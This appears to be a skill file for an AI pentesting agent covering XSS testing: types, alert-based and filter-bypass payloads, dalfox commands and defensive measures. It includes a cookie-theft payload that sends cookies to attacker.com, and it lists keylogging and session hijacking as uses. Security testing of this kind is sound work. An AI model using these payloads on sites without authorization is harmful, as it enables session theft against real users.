---
name: xss-testing
description: Professional skills for XSS cross-site scripting testing
version: 1.0.0
---

# XSS Testing Skill

## Overview

Cross-site scripting (XSS) lets an attacker execute malicious JavaScript in the victim's browser. This skill covers testing methods for reflected, stored, and DOM-based XSS.

## XSS Types

### 1. Reflected XSS
- The malicious script is passed via a URL parameter
- The server returns a response containing the script directly
- Requires the user to click a malicious link

### 2. Stored XSS
- The malicious script is stored on the server (database, files, etc.)
- Every user who visits the affected page executes the script
- A larger impact scope

### 3. DOM-based XSS
- Client-side JavaScript mishandles user input
- No server-side processing involved
- Triggered by modifying the DOM structure

## Testing Method

### Basic Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Bypassing Filters

#### Case Bypass
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding Bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event Handlers
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo-protocols
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced Bypass Techniques

#### Using String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Using eval and atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### Using HTML Entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Tool Usage

### dalfox
```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# Specify a parameter
dalfox url "http://target.com/page" -d "q=test" -X POST

# Use a custom payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Use the Intruder module for batch testing
- Use Repeater for manual testing
- Use Scanner for automatic detection

### Browser Console
- Test DOM-based XSS
- Inspect the JavaScript execution environment
- Debug the payload

## Verification and Exploitation

### Verification Steps
1. Confirm the payload executes
2. Check whether it is filtered or encoded
3. Test different contexts (HTML, JavaScript, attributes, etc.)
4. Assess the impact (cookie theft, session hijacking, etc.)

### Exploitation Scenarios
- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keystroke logging: inject a keyboard event listener
- Phishing attacks: forge a login form
- Session hijacking: obtain the user's session token

## Reporting Points

- XSS type (reflected / stored / DOM)
- Trigger location and parameter
- Complete PoC
- Impact assessment
- Remediation advice (output encoding, CSP policy, etc.)
- Once confirmed, enter the finding into the platform via the `report_finding` tool (the only entry point for recording vulnerabilities on this platform)

## Protective Measures

- Input validation and filtering
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly cookie flag
- Use secure frameworks and libraries
